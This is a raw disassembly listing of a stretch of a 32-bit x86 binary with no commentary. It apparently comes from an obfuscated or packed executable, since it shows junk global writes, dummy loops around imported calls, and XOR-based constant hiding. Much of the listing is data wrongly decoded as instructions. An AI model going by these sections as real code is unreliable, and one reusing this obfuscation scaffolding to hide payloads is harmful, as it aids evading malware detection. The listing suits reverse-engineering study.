  40e1af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e1b0:	daa    
  40e1b1:	push   esi
  40e1b2:	pop    esp
  40e1b3:	lahf   
  40e1b4:	pop    ds
  40e1b5:	fisttp QWORD PTR [edx+esi*1+0x78]
  40e1b9:	sub    al,0xc8
  40e1bb:	test   BYTE PTR [ebx*8-0x4ebaaa42],0x6d
  40e1c3:	mov    cl,0x19
  40e1c5:	xchg   esi,eax
  40e1c6:	les    esi,FWORD PTR [edi+0x26]
  40e1c9:	sbb    dh,BYTE PTR cs:[eax+0x5e]
  40e1cd:	scas   eax,DWORD PTR es:[edi]
  40e1ce:	popa   
  40e1cf:	(bad)  
  40e1d0:	xchg   BYTE PTR [ebx-0x51],al
  40e1d3:	loop   0x40e1b3
  40e1d5:	mov    ebx,0x4665e1c2
  40e1da:	inc    ebx
  40e1db:	mov    cl,0x2b
  40e1dd:	divps  xmm4,XMMWORD PTR [esi+0x2]
  40e1e1:	ss pusha 
  40e1e3:	jp     0x40e262
  40e1e5:	xchg   edx,ecx
  40e1e7:	iret   
  40e1e8:	jnp    0x40e1bb
  40e1ea:	mov    BYTE PTR [edx+0x78],al
  40e1ed:	mov    ds:0x22f32855,eax
  40e1f2:	mov    ah,0x26
  40e1f4:	mov    ah,0xee
  40e1f6:	mov    esp,0xf9c8ab6c
  40e1fb:	mov    al,ds:0xa901d64b
  40e200:	scas   al,BYTE PTR es:[edi]
  40e201:	adc    eax,0xa2ae058e
  40e206:	sub    cl,bl
  40e208:	pop    ebp
  40e209:	jnp    0x40e225
  40e20b:	pop    ebx
  40e20c:	dec    esp
  40e20d:	add    eax,0x5244ce13
  40e212:	popf   
  40e213:	xor    al,0xeb
  40e215:	out    0xd9,al
  40e217:	inc    ebp
  40e218:	xchg   al,ah
  40e21a:	shl    BYTE PTR [esi-0x504aebce],1
  40e220:	or     BYTE PTR [edx+edx*1],dh
  40e223:	icebp  
  40e224:	xlat   BYTE PTR ds:[ebx]
  40e225:	sbb    BYTE PTR ds:0xb5b881ae,dl
  40e22b:	mov    bl,0xd2
  40e22d:	into   
  40e22e:	xor    ecx,DWORD PTR [ecx]
  40e230:	out    0xe1,eax
  40e232:	cli    
  40e233:	sub    esi,DWORD PTR [eax]
  40e235:	pop    edi
  40e236:	jg     0x40e1ec
  40e238:	add    esi,DWORD PTR [esi+0x2da22b35]
  40e23e:	outs   dx,BYTE PTR ds:[esi]
  40e23f:	xchg   ecx,eax
  40e240:	pop    es
  40e241:	rcl    DWORD PTR [edi-0x2df8901c],0x9
  40e248:	loope  0x40e244
  40e24a:	sub    ebx,esp
  40e24c:	repnz push 0x3f538314
  40e252:	mov    WORD PTR [ecx+0x55],fs
  40e255:	shl    edi,0x25
  40e258:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e259:	loop   0x40e253
  40e25b:	push   edx
  40e25c:	push   ecx
  40e25d:	nop
  40e25e:	cld    
  40e25f:	fstp   TBYTE PTR [bp+si]
  40e262:	in     eax,dx
  40e263:	test   DWORD PTR [ebx-0x5e],0xc15eddb
  40e26a:	repnz xchg esp,eax
  40e26c:	mov    bh,0x4f
  40e26e:	mov    esi,0xd51c88e8
  40e273:	popa   
  40e274:	jae    0x40e23b
  40e276:	lahf   
  40e277:	stos   DWORD PTR es:[edi],eax
  40e278:	xchg   DWORD PTR [eax+0x25],esi
  40e27b:	mov    ds:0x96d09e06,eax
  40e280:	repnz pusha 
  40e282:	xor    edi,DWORD PTR [eax]
  40e284:	out    0x54,al
  40e286:	dec    ebx
  40e287:	mov    esp,0xd581ee89
  40e28c:	lds    ebx,FWORD PTR [edi]
  40e28e:	std    
  40e28f:	es not dh
  40e292:	jno    0x40e2ab
  40e294:	push   ebx
  40e295:	call   0xdbfbec18
  40e29a:	hlt    
  40e29b:	mov    edi,0xaea662df
  40e2a0:	push   ecx
  40e2a1:	lds    ecx,FWORD PTR [ecx]
  40e2a3:	mov    al,0xc1
  40e2a5:	arpl   WORD PTR [eax+0x5f],si
  40e2a8:	aad    0xf6
  40e2aa:	lock pop edx
  40e2ac:	pop    esp
  40e2ad:	push   0x40
  40e2af:	add    dh,BYTE PTR [esi-0x35d0a41e]
  40e2b5:	jl     0x40e259
  40e2b7:	pop    ss
  40e2b8:	add    esp,DWORD PTR [ebx+0x28238ba]
  40e2be:	lahf   
  40e2bf:	into   
  40e2c0:	jne    0x40e33a
  40e2c2:	adc    edx,ebx
  40e2c4:	test   eax,0xa77a9b70
  40e2c9:	adc    cl,ch
  40e2cb:	add    ebx,0x500c6e21
  40e2d1:	js     0x40e30b
  40e2d3:	sbb    BYTE PTR [ecx],bl
  40e2d5:	mov    al,ds:0xa3cba1d
  40e2da:	test   DWORD PTR [ebx+ebp*8],esp
  40e2dd:	sti    
  40e2de:	xor    BYTE PTR [edi+0x8],bh
  40e2e1:	dec    edx
  40e2e2:	and    eax,0x67fae3a0
  40e2e7:	push   ebp
  40e2e8:	std    
  40e2e9:	leave  
  40e2ea:	mov    ecx,0xcd9933dc
  40e2ef:	imul   ecx,DWORD PTR [esi-0xf],0x73fc5a15
  40e2f6:	xor    dl,0x5e
  40e2f9:	adc    bh,BYTE PTR [edx-0x46]
  40e2fc:	dec    ebx
  40e2fd:	jmp    0x4ceb:0x79389199
  40e304:	dec    esp
  40e305:	xchg   DWORD PTR fs:[ecx+0x8a14902],ebx
  40e30c:	js     0x40e32b
  40e30e:	mov    edi,0xcfdc2e9
  40e313:	fcomip st,st(3)
  40e315:	push   ds
  40e316:	frstor ds:0x59a1c0a
  40e31c:	sub    DWORD PTR [eax],eax
  40e31e:	es (bad) 
  40e320:	push   ebp
  40e321:	jg     0x40e2a4
  40e323:	popa   
  40e324:	mov    ch,0x42
  40e326:	pop    eax
  40e327:	lsl    ecx,di
  40e32a:	int    0xc3
  40e32c:	test   BYTE PTR [edi+0x32fab61d],dl
  40e332:	daa    
  40e333:	dec    ebx
  40e334:	xor    edx,edx
  40e336:	add    DWORD PTR [ebp-0xc],ebx
  40e339:	pop    ebx
  40e33a:	mov    eax,DWORD PTR [ebp-0xc]
  40e33d:	pop    edi
  40e33e:	pop    esi
  40e33f:	pop    ebx
  40e340:	leave  
  40e341:	ret    0x10
  40e344:	push   ebp
  40e345:	mov    ebp,esp
  40e347:	push   ecx
  40e348:	mov    DWORD PTR ds:0x433797,0x77e5
  40e352:	push   ecx
  40e353:	mov    DWORD PTR ds:0x4338a7,0xd96
  40e35d:	mov    eax,0xf89c8532
  40e362:	mov    DWORD PTR ds:0x43386b,0x6f59
  40e36c:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40e373:	push   esi
  40e374:	movzx  ecx,WORD PTR ds:0x4337eb
  40e37b:	mov    DWORD PTR [ebp-0x8],eax
  40e37e:	mov    ecx,DWORD PTR [ebp+0x8]
  40e381:	mov    DWORD PTR ds:0x43383b,0x659
  40e38b:	push   edi
  40e38c:	mov    edi,0x7510854
  40e391:	not    esi
  40e393:	mov    esi,0x32729b
  40e398:	mov    DWORD PTR ds:0x4337e7,0x4cec
  40e3a2:	cmp    ecx,eax
  40e3a4:	mov    DWORD PTR ds:0x43382f,0x27d6
  40e3ae:	jmp    0x40e4db
  40e3b3:	cs jecxz 0x40e357
  40e3b6:	add    eax,0xf1aa4571
  40e3bb:	push   0x47
  40e3bd:	popf   
  40e3be:	dec    DWORD PTR [eax+ebx*8-0x44]
  40e3c2:	in     eax,dx
  40e3c3:	aas    
  40e3c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e3c5:	jle    0x40e445
  40e3c7:	push   cs
  40e3c8:	jg     0x40e448
  40e3ca:	jle    0x40e3f7
  40e3cc:	add    BYTE PTR [edi-0x15],al
  40e3cf:	cmp    al,0x7d
  40e3d1:	pop    ss
  40e3d2:	mov    ecx,0xf2f975c7
  40e3d7:	pop    ebx
  40e3d8:	add    al,0x68
  40e3da:	sbb    bh,BYTE PTR [ebx]
  40e3dc:	(bad)  
  40e3dd:	push   ebx
  40e3de:	and    BYTE PTR [ebx],dl
  40e3e0:	dec    edi
  40e3e1:	test   al,0x8b
  40e3e3:	call   0xe3c50d06
  40e3e8:	mov    al,0x6e
  40e3ea:	add    bh,dl
  40e3ec:	mov    ebp,0xf73f1b86
  40e3f1:	ficom  WORD PTR [ebx+0x7ea0fb47]
  40e3f7:	aad    0x5a
  40e3f9:	and    eax,0xffd64f6b
  40e3fe:	inc    ebx
  40e3ff:	or     bl,BYTE PTR [ebp+0x44]
  40e402:	pop    ebx
  40e403:	cdq    
  40e404:	out    0x39,eax
  40e406:	or     eax,0xce73bfdc
  40e40b:	xchg   DWORD PTR ss:[edx],ebx
  40e40e:	push   esp
  40e40f:	lods   al,BYTE PTR ds:[esi]
  40e410:	push   edi
  40e411:	das    
  40e412:	(bad)  
  40e413:	pop    esi
  40e414:	mov    dl,BYTE PTR [edx-0x3]
  40e417:	push   0x2
  40e419:	aas    
  40e41a:	mov    ds:0x223d7404,eax
  40e41f:	mov    dl,0xef
  40e421:	dec    ebp
  40e422:	jl     0x40e45e
  40e424:	bound  ecx,QWORD PTR [esi]
  40e426:	outs   dx,DWORD PTR ds:[esi]
  40e427:	inc    edi
  40e428:	stos   DWORD PTR es:[edi],eax
  40e429:	sar    DWORD PTR [ecx+edx*4+0x3f],cl
  40e42d:	or     bl,BYTE PTR [edx+eax*1+0x4a59abc7]
  40e434:	dec    edi
  40e435:	in     al,0xb0
  40e437:	sahf   
  40e438:	call   0xf28955a1
  40e43d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e43e:	cs add eax,0xb5bb189b
  40e444:	loope  0x40e45f
  40e446:	loopne 0x40e425
  40e448:	mov    DWORD PTR [ecx-0xcfa3d19],ebp
  40e44e:	(bad)  
  40e44f:	xchg   ecx,eax
  40e450:	sbb    DWORD PTR [ebx+ecx*8],ecx
  40e453:	cs dec ebx
  40e455:	mov    bl,0x10
  40e457:	fucomi st,st(4)
  40e459:	int3   
  40e45a:	push   0xffffffc4
  40e45c:	jecxz  0x40e4dd
  40e45e:	popf   
  40e45f:	ret    0xcef9
  40e462:	push   eax
  40e463:	adc    al,0x7d
  40e465:	push   edx
  40e466:	jmp    0x7109c81f
  40e46b:	aad    0xe0
  40e46d:	ret    0x2d7d
  40e470:	ins    BYTE PTR es:[edi],dx
  40e471:	inc    ebx
  40e472:	jmp    0x40e407
  40e474:	adc    eax,0x1ab7f95b
  40e479:	leave  
  40e47a:	mov    ebp,0x49980a5d
  40e47f:	adc    DWORD PTR [edi],0x37
  40e482:	xchg   bl,al
  40e484:	data16 aam 0xb3
  40e487:	jge    0x40e45a
  40e489:	popa   
  40e48a:	add    DWORD PTR [ebx],0x75
  40e48d:	jmp    0x40e45c
  40e48f:	and    al,0x72
  40e491:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e492:	or     DWORD PTR [edx],0xffffffc2
  40e495:	sub    al,0xe9
  40e497:	push   0x7dbbce46
  40e49c:	test   al,0xc1
  40e49e:	xchg   esp,eax
  40e49f:	push   ecx
  40e4a0:	shr    DWORD PTR [esi+0x6],1
  40e4a3:	cmp    DWORD PTR [ebx],edi
  40e4a5:	jecxz  0x40e438
  40e4a7:	jg     0x40e513
  40e4a9:	pop    ss
  40e4aa:	test   eax,0x35b240bd
  40e4af:	inc    ecx
  40e4b0:	in     al,0xbc
  40e4b2:	jl     0x40e487
  40e4b4:	mov    ds:0xfc88ee92,al
  40e4b9:	outs   dx,BYTE PTR ds:[esi]
  40e4ba:	sbb    al,0x69
  40e4bc:	dec    ecx
  40e4bd:	jmp    0x40e479
  40e4bf:	pop    esp
  40e4c0:	mov    ds:0x892a5a59,eax
  40e4c5:	adc    eax,0x5a708440
  40e4ca:	pushf  
  40e4cb:	adc    BYTE PTR [edx-0x1a386641],dh
  40e4d1:	mov    ah,0x4f
  40e4d3:	ins    DWORD PTR es:[edi],dx
  40e4d4:	or     cl,BYTE PTR [ebx+0x3d]
  40e4d7:	je     0x40e4c2
  40e4d9:	fisubr DWORD PTR [edx+0x1fa840f]
  40e4df:	add    BYTE PTR [eax],al
  40e4e1:	add    DWORD PTR ds:0x4338b3,0x32bd
  40e4eb:	mov    eax,DWORD PTR [ebp-0x4]
  40e4ee:	mov    ecx,DWORD PTR [ebp+0xc]
  40e4f1:	xor    DWORD PTR ds:0x433797,0x43383f
  40e4fb:	xor    eax,edi
  40e4fd:	add    eax,esi
  40e4ff:	cmp    eax,ecx
  40e501:	mov    DWORD PTR ds:0x4338b3,0x147f
  40e50b:	je     0x40e6db
  40e511:	and    DWORD PTR ds:0x433827,0x0
  40e51b:	jmp    0x40e52b
  40e520:	mov    eax,ds:0x433827
  40e525:	inc    eax
  40e526:	mov    ds:0x433827,eax
  40e52b:	cmp    DWORD PTR ds:0x433827,0x13
  40e532:	jae    0x40e568
  40e538:	cmp    DWORD PTR ds:0x433827,0x9
  40e53f:	jne    0x40e54b
  40e545:	call   DWORD PTR ds:0x412030
  40e54b:	cmp    DWORD PTR ds:0x433827,0x8
  40e552:	jne    0x40e563
  40e558:	mov    eax,ds:0x433827
  40e55d:	inc    eax
  40e55e:	mov    ds:0x433827,eax
  40e563:	jmp    0x40e520
  40e568:	mov    eax,DWORD PTR [ebp-0x4]
  40e56b:	sub    edx,DWORD PTR ds:0x43383b
  40e571:	xor    eax,edi
  40e573:	dec    edx
  40e574:	add    eax,esi
  40e576:	push   eax
  40e577:	adc    DWORD PTR ds:0x433833,0x52cc
  40e581:	push   DWORD PTR [ebp-0x8]
  40e584:	or     DWORD PTR ds:0x4337fb,edx
  40e58a:	push   DWORD PTR [ebp-0x4]
  40e58d:	mov    edx,DWORD PTR ds:0x413bde
  40e593:	call   0x406864
  40e598:	mov    ecx,DWORD PTR ds:0x413bde
  40e59e:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40e5a4:	mov    DWORD PTR [ecx],eax
  40e5a6:	mov    eax,DWORD PTR [ebp-0x8]
  40e5a9:	jmp    0x40e840
  40e5ae:	jmp    0x40e6db
  40e5b3:	xor    dl,BYTE PTR [ebp-0x2e]
  40e5b6:	fs jno 0x40e61a
  40e5b9:	mov    al,0x51
  40e5bb:	sti    
  40e5bc:	adc    eax,0x14ca9328
  40e5c1:	and    cl,BYTE PTR [edi]
  40e5c3:	iret   
  40e5c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e5c5:	jle    0x40e645
  40e5c7:	push   cs
  40e5c8:	jg     0x40e648
  40e5ca:	jle    0x40e62e
  40e5cc:	mov    esi,DWORD PTR ds:0x37f721d8
  40e5d2:	jg     0x40e570
  40e5d4:	or     BYTE PTR [eax+0x3a],cl
  40e5d7:	aam    0x96
  40e5d9:	dec    edi
  40e5da:	retf   0x2570
  40e5dd:	jecxz  0x40e5d8
  40e5df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e5e0:	cmc    
  40e5e1:	(bad)  
  40e5e3:	pop    ecx
  40e5e4:	lods   al,BYTE PTR ds:[esi]
  40e5e5:	push   eax
  40e5e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e5e7:	pop    eax
  40e5e8:	jle    0x40e611
  40e5ea:	out    dx,al
  40e5eb:	dec    ebx
  40e5ec:	xor    ebx,DWORD PTR [eax-0x56477820]
  40e5f2:	stos   BYTE PTR es:[edi],al
  40e5f3:	jmp    0x40e624
  40e5f5:	pushf  
  40e5f6:	xor    ebx,ebx
  40e5f8:	cli    
  40e5f9:	(bad)
  40e5fc:	cdq    
  40e5fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e5fe:	stc    
  40e5ff:	xchg   ebx,eax
  40e600:	dec    ecx
  40e601:	adc    al,0xea
  40e603:	and    DWORD PTR [ebp-0x40cc5331],0x6e5c8fb3
  40e60d:	xchg   ecx,eax
  40e60e:	sbb    eax,0xdf2558f4
  40e613:	out    dx,eax
  40e614:	ss or  al,bl
  40e617:	push   ecx
  40e618:	sti    
  40e619:	push   ebx
  40e61a:	xchg   ebx,eax
  40e61b:	ins    BYTE PTR es:[edi],dx
  40e61c:	not    DWORD PTR ds:0xa019e5ae
  40e622:	pusha  
  40e623:	sbb    cl,BYTE PTR [edx-0x58]
  40e626:	fs cs in eax,0x59
  40e62a:	arpl   sp,bx
  40e62c:	cmp    eax,0xc4254cea
  40e631:	jno    0x40e5b8
  40e633:	cwde   
  40e634:	shl    DWORD PTR [ebp+0x7e],1
  40e637:	add    eax,0x2b3345df
  40e63c:	lahf   
  40e63d:	inc    esp
  40e63e:	adc    BYTE PTR [ebx+0x42],ah
  40e641:	jle    0x40e68f
  40e643:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e644:	xor    ecx,0xffffffb6
  40e647:	cli    
  40e648:	aam    0xc8
  40e64a:	ds pop es
  40e64c:	cdq    
  40e64d:	jne    0x40e647
  40e64f:	repz bound eax,QWORD PTR [edx-0x64]
  40e653:	mov    edx,0x835b9304
  40e658:	push   es
  40e659:	mov    dh,0xba
  40e65b:	fidivr WORD PTR [edx+0x3f]
  40e65e:	hlt    
  40e65f:	pop    esi
  40e660:	mov    esi,0x151c3830
  40e665:	adc    DWORD PTR [edx-0x7f],edi
  40e668:	add    edi,DWORD PTR [edx+0x344f0c83]
  40e66e:	adc    edi,DWORD PTR [edx]
  40e670:	xor    eax,0x5ea625b1
  40e675:	in     al,dx
  40e676:	jge    0x40e6cc
  40e678:	stos   BYTE PTR es:[edi],al
  40e679:	rcl    esp,0x48
  40e67c:	(bad)  
  40e67d:	retf   0x1898
  40e680:	call   0x739c1753
  40e685:	daa    
  40e686:	loope  0x40e65a
  40e688:	pusha  
  40e689:	sub    edi,0x4e
  40e68c:	in     al,dx
  40e68d:	test   al,0xc4
  40e68f:	pop    ecx
  40e690:	adc    BYTE PTR [ebp-0x249a5720],cl
  40e696:	push   0x62
  40e698:	pop    ds
  40e699:	call   0x8e3d:0x3f88145c
  40e6a0:	xor    BYTE PTR [edx-0x114b5bcd],cl
  40e6a6:	in     al,0xab
  40e6a8:	adc    eax,0x8cdbe4a1
  40e6ad:	js     0x40e6d5
  40e6af:	pop    eax
  40e6b0:	int3   
  40e6b1:	jle    0x40e644
  40e6b3:	cmp    DWORD PTR [ecx-0x7b],esi
  40e6b6:	push   esi
  40e6b7:	and    dh,BYTE PTR [edx-0x14]
  40e6ba:	ins    DWORD PTR es:[edi],dx
  40e6bb:	pop    eax
  40e6bc:	mov    edi,0x4e5f2f6f
  40e6c1:	mov    ebp,0x8a084d09
  40e6c6:	or     edx,DWORD PTR [ebx+0x3f]
  40e6c9:	and    al,0x2d
  40e6cb:	retf   
  40e6cc:	jmp    0x1977:0xf7d244b7
  40e6d3:	rol    BYTE PTR gs:[eax-0x343ee44],1
  40e6da:	ror    DWORD PTR [ebx+0x4d8bfc45],0x10
  40e6e1:	xor    eax,edi
  40e6e3:	add    eax,esi
  40e6e5:	cmp    eax,ecx
  40e6e7:	jne    0x40e83d
  40e6ed:	mov    eax,DWORD PTR [ebp-0x4]
  40e6f0:	xor    eax,edi
  40e6f2:	add    eax,esi
  40e6f4:	jmp    0x40e821
  40e6f9:	xor    BYTE PTR [ebx+0x7369636a],al
  40e6ff:	xor    DWORD PTR [ecx+0x23],edx
  40e702:	mov    ebp,0x36bd30a1
  40e707:	adc    al,BYTE PTR [edx]
  40e709:	fbld   TBYTE PTR [edx+0x7f0e7e7e]
  40e70f:	jle    0x40e78f
  40e711:	mov    cl,0xbe
  40e713:	icebp  
  40e714:	je     0x73261609
  40e71a:	fisub  DWORD PTR [ecx]
  40e71c:	add    al,0x0
  40e71e:	xchg   cl,ch
  40e720:	je     0x40e758
  40e722:	mov    ebp,0xb637a052
  40e727:	cmp    edx,DWORD PTR [edx]
  40e729:	jo     0x40e769
  40e72b:	mov    ebp,0x96fdff2b
  40e730:	jae    0x40e6d8
  40e732:	clc    
  40e733:	(bad)  
  40e734:	es jnp 0x40e788
  40e737:	push   ecx
  40e738:	xchg   ecx,eax
  40e739:	rcl    BYTE PTR [edi-0x5c4d9f84],0x9c
  40e740:	fcmovne st,st(2)
  40e742:	push   ss
  40e743:	nop
  40e744:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e745:	(bad)  
  40e746:	daa    
  40e747:	dec    eax
  40e748:	int3   
  40e749:	xchg   BYTE PTR [ebp-0x5b],dl
  40e74c:	shl    ah,cl
  40e74e:	jbe    0x40e741
  40e750:	xor    DWORD PTR [esi+0x3d],esp
  40e753:	mov    edx,0xaf79455b
  40e758:	daa    
  40e759:	pop    edx
  40e75a:	pop    esi
  40e75b:	fucomp st(1)
  40e75d:	and    eax,0xbe42362b
  40e762:	jmp    DWORD PTR [eax-0x1]
  40e765:	add    DWORD PTR [esi+ecx*8+0x7e],0xffffffc2
  40e76a:	xchg   ebx,eax
  40e76b:	out    0xad,al
  40e76d:	jmp    0x40e74d
  40e76f:	mov    al,0x8c
  40e771:	xor    BYTE PTR [ecx],ah
  40e773:	cli    
  40e774:	fidiv  WORD PTR [edi*1+0x6a199070]
  40e77b:	add    DWORD PTR [edx],edx
  40e77d:	lock adc eax,0xc7dad1be
  40e783:	xor    BYTE PTR [ecx],bl
  40e785:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e786:	sub    ch,BYTE PTR [ebx-0x3f98e36]
  40e78c:	mov    ds:0x83b80191,al
  40e791:	fucomi st,st(7)
  40e793:	cmc    
  40e794:	mov    bh,0x13
  40e796:	das    
  40e797:	scas   eax,DWORD PTR es:[edi]
  40e798:	das    
  40e799:	iret   
  40e79a:	fs dec ebx
  40e79c:	leave  
  40e79d:	adc    al,0xaf
  40e79f:	in     eax,0xb1
  40e7a1:	aad    0x12
  40e7a3:	mov    esi,0x580815f9
  40e7a8:	inc    ebp
  40e7a9:	out    0x25,eax
  40e7ab:	jo     0x40e806
  40e7ad:	mov    ebx,DWORD PTR [edi-0xb5e5f5d]
  40e7b3:	leave  
  40e7b4:	adc    ebx,DWORD PTR [edx]
  40e7b6:	movsx  ebp,bx
  40e7b9:	fxtract 
  40e7bb:	xor    BYTE PTR [ebx+0x1c],bl
  40e7be:	je     0xe9688e21
  40e7c4:	push   eax
  40e7c5:	enter  0x9ac9,0xf2
  40e7c9:	jmp    0x864fe5e8
  40e7ce:	jl     0x40e7b7
  40e7d0:	mov    ecx,0x2a41a816
  40e7d5:	push   0x3bef30de
  40e7da:	push   ecx
  40e7db:	ror    ch,0xe1
  40e7de:	mov    ds:0x886138db,al
  40e7e3:	mov    edx,0x29dc75db
  40e7e8:	ss std 
  40e7ea:	fist   WORD PTR [ebx+0x35323586]
  40e7f0:	xor    bl,BYTE PTR [eax]
  40e7f2:	pop    ds
  40e7f3:	and    ch,BYTE PTR [ebx+0x3ef7cfd6]
  40e7f9:	mov    edx,0xff30e4a0
  40e7fe:	clc    
  40e7ff:	(bad)  
  40e800:	jmp    0x96fa76cb
  40e805:	adc    ah,BYTE PTR [ebp-0x19afb959]
  40e80b:	rcr    DWORD PTR [ebp+0x36],0x68
  40e80f:	cmp    al,0x70
  40e811:	aas    
  40e812:	je     0x40e813
  40e814:	sub    dl,BYTE PTR [edi+0x58]
  40e817:	enter  0x996b,0x73
  40e81b:	mov    ch,0x42
  40e81d:	in     al,dx
  40e81e:	adc    dh,BYTE PTR [esi+eiz*1]
  40e821:	mov    ds:0x413c62,eax
  40e826:	mov    eax,DWORD PTR [ebp-0x4]
  40e829:	xor    eax,edi
  40e82b:	add    eax,esi
  40e82d:	mov    ds:0x413c5a,eax
  40e832:	push   DWORD PTR [ebp-0x8]
  40e835:	push   DWORD PTR [ebp-0x4]
  40e838:	call   0x40e84a
  40e83d:	mov    eax,DWORD PTR [ebp-0x4]
  40e840:	xor    eax,edi
  40e842:	pop    edi
  40e843:	add    eax,esi
  40e845:	pop    esi
  40e846:	leave  
  40e847:	ret    0xc
  40e84a:	push   ebp
  40e84b:	mov    ebp,esp
  40e84d:	sub    esp,0x60
  40e850:	mov    eax,DWORD PTR [ebp+0x8]
  40e853:	push   ebx
  40e854:	and    DWORD PTR ds:0x4338bf,0x0
  40e85e:	jmp    0x40e870
  40e863:	mov    ebx,DWORD PTR ds:0x4338bf
  40e869:	inc    ebx
  40e86a:	mov    DWORD PTR ds:0x4338bf,ebx
  40e870:	cmp    DWORD PTR ds:0x4338bf,0x19
  40e877:	jae    0x40e8a2
  40e87d:	cmp    DWORD PTR ds:0x4338bf,0x1e
  40e884:	jne    0x40e893
  40e88a:	push   DWORD PTR [ebp-0x14]
  40e88d:	call   DWORD PTR ds:0x412034
  40e893:	jmp    0x40e863
  40e898:	sub    DWORD PTR ds:0x43383f,0x283f
  40e8a2:	push   esi
  40e8a3:	and    DWORD PTR ds:0x43387f,0x0
  40e8ad:	mov    esi,DWORD PTR ds:0x43387f
  40e8b3:	inc    esi
  40e8b4:	mov    DWORD PTR ds:0x43387f,esi
  40e8ba:	cmp    DWORD PTR ds:0x43387f,0x10
  40e8c1:	jne    0x40e8d5
  40e8c7:	push   0x4337ff
  40e8cc:	push   DWORD PTR [ebp-0x28]
  40e8cf:	call   DWORD PTR ds:0x4123ac
  40e8d5:	cmp    DWORD PTR ds:0x43387f,0xf
  40e8dc:	jne    0x40e8ef
  40e8e2:	mov    esi,DWORD PTR ds:0x43387f
  40e8e8:	inc    esi
  40e8e9:	mov    DWORD PTR ds:0x43387f,esi
  40e8ef:	cmp    DWORD PTR ds:0x43387f,0x1a
  40e8f6:	jb     0x40e8ad
  40e8fc:	mov    DWORD PTR ds:0x433877,0x1e
  40e906:	cmp    DWORD PTR ds:0x433877,0x0
  40e90d:	je     0x40e960
  40e913:	cmp    DWORD PTR ds:0x433877,0xc
  40e91a:	jne    0x40e933
  40e920:	push   0x6d58
  40e925:	push   DWORD PTR [ebp-0x20]
  40e928:	push   0x30b0
  40e92d:	call   DWORD PTR ds:0x4121e0
  40e933:	cmp    DWORD PTR ds:0x433877,0xd
  40e93a:	jne    0x40e94d
  40e940:	mov    ebx,DWORD PTR ds:0x433877
  40e946:	dec    ebx
  40e947:	mov    DWORD PTR ds:0x433877,ebx
  40e94d:	mov    ebx,DWORD PTR ds:0x433877
  40e953:	dec    ebx
  40e954:	mov    DWORD PTR ds:0x433877,ebx
  40e95a:	jmp    0x40e906
  40e95f:	dec    esi
  40e960:	mov    esi,0x7510854
  40e965:	xor    eax,esi
  40e967:	mov    ebx,0x32729b
  40e96c:	add    eax,ebx
  40e96e:	and    DWORD PTR ds:0x433827,0x3e06
  40e978:	push   edi
  40e979:	neg    DWORD PTR ds:0x4337ab
  40e97f:	mov    DWORD PTR [ebp-0x18],eax
  40e982:	and    DWORD PTR ds:0x43379b,0x0
  40e98c:	mov    edi,DWORD PTR ds:0x43379b
  40e992:	inc    edi
  40e993:	mov    DWORD PTR ds:0x43379b,edi
  40e999:	cmp    DWORD PTR ds:0x43379b,0x21
  40e9a0:	jne    0x40e9b4
  40e9a6:	push   DWORD PTR [ebp-0x1c]
  40e9a9:	push   0x43383b
  40e9ae:	call   DWORD PTR ds:0x4121e4
  40e9b4:	cmp    DWORD PTR ds:0x43379b,0x12
  40e9bb:	jb     0x40e98c
  40e9c1:	sbb    DWORD PTR ds:0x43379b,edx
  40e9c7:	mov    edi,DWORD PTR [ebp+0x8]
  40e9ca:	xor    edi,esi
  40e9cc:	and    DWORD PTR ds:0x4337eb,0x43378f
  40e9d6:	mov    DWORD PTR [ebp-0xc],0xf89c85f1
  40e9dd:	adc    DWORD PTR ds:0x4338b7,0x43383f
  40e9e7:	mov    DWORD PTR [ebp-0x10],0xf89c8731
  40e9ee:	sub    DWORD PTR ds:0x4337ff,0x43383b
  40e9f8:	add    edi,ebx
  40e9fa:	mov    DWORD PTR ds:0x43382b,0x5e0d
  40ea04:	jmp    0x40f1b9
  40ea09:	cmp    edi,0x40
  40ea0c:	jne    0x40ec91
  40ea12:	movzx  eax,BYTE PTR ds:0x43379f
  40ea19:	mov    eax,ds:0x413a5e
  40ea1e:	jmp    0x40ec4b
  40ea23:	xchg   BYTE PTR [edi],dh
  40ea25:	inc    ebx
  40ea26:	(bad)  
  40ea27:	jae    0x40ea94
  40ea29:	push   edx
  40ea2a:	aaa    
  40ea2b:	mov    ds:0x7e103a68,al
  40ea30:	sub    eax,0xa3efa0eb
  40ea35:	jle    0x40eab5
  40ea37:	push   cs
  40ea38:	jl     0x40eab8
  40ea3a:	jle    0x40ea64
  40ea3c:	push   ebp
  40ea3d:	cmp    al,0x61
  40ea3f:	outs   dx,BYTE PTR ds:[esi]
  40ea40:	mov    ebp,0x6c187490
  40ea45:	in     al,dx
  40ea46:	ret    0x6f45
  40ea49:	fst    st(6)
  40ea4b:	push   edx
  40ea4c:	inc    edi
  40ea4d:	add    al,0x7d
  40ea4f:	inc    edx
  40ea50:	out    0x92,al
  40ea52:	and    edi,DWORD PTR [esi]
  40ea54:	rcl    BYTE PTR [ecx],cl
  40ea56:	add    cl,0x9f
  40ea59:	cmp    eax,0x87d87ae
  40ea5e:	jmp    0x40eaa4
  40ea60:	jmp    0xd9f2:0xcb7b2442
  40ea67:	stos   DWORD PTR es:[edi],eax
  40ea68:	xchg   ah,bh
  40ea6a:	test   BYTE PTR [eax-0x75],ch
  40ea6d:	add    ebx,ebx
  40ea6f:	(bad)  
  40ea70:	fs int 0xee
  40ea73:	mov    edx,0x23b95a75
  40ea78:	not    DWORD PTR [eax]
  40ea7a:	push   0x38
  40ea7c:	test   al,0x73
  40ea7e:	and    eax,0xfa961102
  40ea83:	mov    dh,0x47
  40ea85:	imul   edx,DWORD PTR [edx+0xddb56c8],0x78
  40ea8c:	dec    eax
